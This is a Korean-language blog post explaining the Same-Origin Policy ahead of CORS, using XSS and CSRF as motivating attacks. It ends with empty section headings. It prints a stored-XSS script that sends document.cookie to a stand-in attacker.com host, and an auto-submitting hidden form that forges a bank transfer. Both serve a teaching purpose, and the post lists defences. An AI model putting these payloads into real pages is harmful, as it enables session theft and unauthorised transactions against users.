---
title: CORS(Cross-Origin Resource Sharing) 이해하기
date: 2025-01-20 16:30:00 +09:00
last_modified_at: 2025-01-20 16:30:00 +09:00
categories: [Browser]
tags:
  [
    CORS,
    SOP,
    Browser
  ]
---

`CORS(Cross-Origin Resource Sharing)`는 서로 다른 출처간의 리소스를 공유하기 위한 매커니즘입니다.  
이러한 정책이 필요한 이유를 이해하기 위해 `SOP(Same-Origin Policy)`부터 시작하여 차근차근 정리해보겠습니다.

## SOP(Same-Origin Policy)
SOP(Same-Origin Policy, 동일 출처 정책)는 어떤 출처에서 로드된 문서나 스크립트등이 다른 출처의 리소스에 접근하지 못하도록 제한하는 중요한 보안 메커니즘입니다.  
이를 통해 악의적인 스크립트가 다른 출처의 민감한 데이터를 탈취하는 것을 방지합니다.

### SOP 정의
> SOP에서 `출처(Origin)`는 **프로토콜(protocol)**, **호스트(host)**, **포트(port)** 를 모두 포함한 개념입니다.  
> 즉, 프로토콜, 호스트, 포트가 동일하면 같은 출처(Same-Origin)라고 할 수 있습니다.

| ![URL 구성요소](https://github.com/user-attachments/assets/2add14b1-0e2e-498a-a9da-f5a4df3ffffd) |
|:--------------------------------------------------------------------------------------------:|
|                                *URL 구성요소*                                                    |
  
- 예시:
  - Origin: http://hajeonghun.com
    - http://hajeonghun.com/page1 → ✅ 포트가 생략되면 기본 포트기준으로 http 80이므로 동일 출처.
    - http://hajeonghun.com:80/page1 → ✅ 프로토콜, 호스트, 포트가 같으므로 동일 출처.
    - http://hajeonghun.com:3000/page1 → ❌ 포트가 다르므로 다른 출처.
    - https://hajeonghun.com:443/page1 → ❌ 프로토콜이 다르므로 다른 출처.
    - http://api.hajeonghun.com:80/page1 → ❌ 서브도메인이 다르므로 다른 출처.

### 초창기 웹의 역할과 보안 문제
1990년대 초 웹은 단순한 정적 문서 기반으로 시작되었으며, 보안에 대한 개념이 초기에는 크게 고려되지 않았습니다.

- 초기 웹의 특성:
  - HTML 문서와 이미지 등 단순 리소스를 가져오는 용도로 설계됨.
- 자바스크립트 등장:
  - 1995년 자바스크립트가 등장하며 클라이언트 측에서 동적 동작과 데이터를 처리할 수 있는 기능이 추가됨.
- 문제:
  - 초기에는 출처(Origin)에 대한 제약이 없었기 때문에 웹 페이지에서 다른 사이트의 데이터를 자유롭게 가져오거나, 악의적인 사이트가 민감한 정보를 탈취할 가능성이 있었습니다. (XSS, CSRF 등...)

### SOP 탄생배경
웹이 동적으로 발전하면서 같이 보안 문제도 증가하게 되었습니다. 이에 따라 잠재적으로 악의적인 사이트간의 격리를 통해 공격 가능성을 줄이기 위해 탄생하였습니다.
- 브라우저의 역할 확대:
  - 브라우저가 단순 문서 뷰어에서 클라이언트-서버 통신을 담당하는 플랫폼으로 발전하면서, 공격자가 자바스크립트를 이용해 민감한 정보를 훔치거나 서버에 무단 요청을 보내는 공격이 가능해짐.
- 보안 공격의 현실화:
  - XSS(Cross-Site Scripting): 공격자가 사용자 브라우저에서 악성 스크립트를 실행.
  - CSRF(Cross-Site Request Forgery): 공격자가 사용자의 인증 정보를 도용하여 악의적인 요청을 수행.
  - 이런 공격이 SOP가 없는 초기 환경에서는 매우 쉽게 이루어졌습니다.

   | 구분    | 	CSRF                                      | 	XSS                                       |  
    |-------|--------------------------------------------|--------------------------------------------|  
    | 공격 대상 | 	서버                                        | 	사용자                                       |  
    | 피해자   | 	인증된 사용자가 자신의 인증 정보를 기반으로 위조된 요청을 보내는 경우.	 | 웹사이트의 취약점을 악용하여 다른 사용자가 악성 스크립트를 실행하도록 유도. |

> 💡 SOP(Same-Origin Policy)만으로는 웹 보안을 완벽히 달성할 수 없으며, XSS와 CSRF를 방어하기 위해 별도의 보안 대책이 필요합니다.

### XSS(Cross-Site Scripting, 크로스사이트 스크립팅)
> XSS(Cross-Site Scripting, 크로스사이트 스크립팅)은 해커가 입력한 악의적인 스크립트가 클라이언트 측에서 실행되는 공격으로    
쿠키 값 또는 세션 등 사용자의 중요 정보를 탈취하거나 피싱 사이트로의 접근 유도 등 클라이언트 측에 직접적인 피해를 줄 수 있습니다.

|  ![xss 공격](https://github.com/user-attachments/assets/07d1fa42-49c9-46d8-afbf-1dfee10b44d2)  |
|:--------------------------------------------------------------------------------------------:|
|                                *Stored XSS (저장형 크로스사이트 스크립팅)*                                |

1. XSS 공격 시나리오 (SOP 도입 전)
   1. 공격자가 게시판과 같은 사용자 입력을 처리하는 사이트(예: http://hajeonghun.com)에서 악성 JavaScript 코드를 삽입한 게시물 작성
   2. 삽입된 코드는 사용자가 해당 페이지에 방문하여 게시물을 열람할 때 실행되어, 사용자의 쿠키(로그인 세션)를 공격자 서버로 전송

2. 공격 코드  

```html
<!-- 공격자가 게시판에 삽입한 악성 스크립트 -->
<script>
  // 사용자의 쿠키를 공격자 서버로 전송
  fetch("http://attacker.com/steal-cookie", {
    method: "POST",
    body: JSON.stringify({ cookie: document.cookie }),
    headers: { "Content-Type": "application/json" }
  });
</script>
```  
  
- SOP가 없는 상황에서 발생 가능한 문제  
   - 브라우저는 document.cookie에 대해 출처를 제한하지 않으므로, 이 스크립트는 사용자가 현재 방문 중인 웹사이트(예: http://hajeonghun.com)의 쿠키에 접근할 수 있습니다.  
   - 공격자는 사용자의 로그인 세션을 탈취해 해당 사용자의 계정을 도용할 수 있습니다.

> 💡 SOP는 XSS 자체를 100% 방어하지 못하며, 이를 방어하기 위해서는 입력 검증(e.g., HTML 엔티티 인코딩, 정규식 검증) 및 **CSP(Content Security Policy)** 와 같은 별도의 보안 대책이 필요합니다.

### CSRF(Cross-Site Request Forgery, 사이트 간 요청 위조)
> CSRF(Cross-Site Request Forgery, 사이트 간 요청 위조)는 사용자가 의도하지 않은 요청을 신뢰할 수 있는 웹 애플리케이션에 보냄으로써 발생하는 보안 취약점입니다.  
공격자는 피해자의 인증 정보를 악용하여 서버에 권한이 있는 요청을 위조합니다.

|  ![csrf 공격](https://github.com/user-attachments/assets/d3fc10a2-4056-434c-b85c-7b0a22b75839)  |
|:---------------------------------------------------------------------------------------------:|
|                                     *CSRF (사이트 간 요청 위조)*                                      

1. CSRF 공격 시나리오 (SOP 도입 전)
   1. 사용자가 은행 사이트(예: http://bank.com)에 로그인한 상태에서, 공격자 사이트(예: http://attacker.com)를 방문
   2. 공격자 사이트는 사용자의 인증된 세션을 악용하여 은행 서버로 요청을 보냄  

2. 공격 코드   

```html
<!-- 공격자가 자신의 악성 사이트(예: http://attacker.com)에 삽입 -->
<form action="http://bank.com/api/transfer" method="POST">
  <input type="hidden" name="to_account" value="1103109999">
  <input type="hidden" name="amount" value="30000000">
  <input type="submit" value="Click here to win a prize!">
</form>

<script>
  // 사용자가 버튼을 클릭하지 않아도 자동으로 폼 제출
  document.forms[0].submit();
</script>
```  

- SOP가 없는 상황에서 발생 가능한 문제
   - 은행 사이트(예: http://bank.com)의 인증 쿠키는 SOP가 없기 때문에 자동으로 서버에 전송됩니다.
   - 은행 서버는 요청이 신뢰할 수 있는 출처에서 온 것인지 확인하지 않고 처리합니다.
   - 결과적으로 사용자는 알지 못한 채로 자신의 계좌에서 돈이 빠져나갑니다.

> 💡 SOP는 CSRF를 100% 방어하지 못합니다. CSRF 방어를 위해서는 CSRF 토큰, Referer 헤더 확인, 또는 SameSite 쿠키 설정 등의 추가적인 보안 메커니즘이 필요합니다.


### SOP의 주요 목적
### SOP가 해결한 보안 문제
### SOP의 한계와 이후의 확장
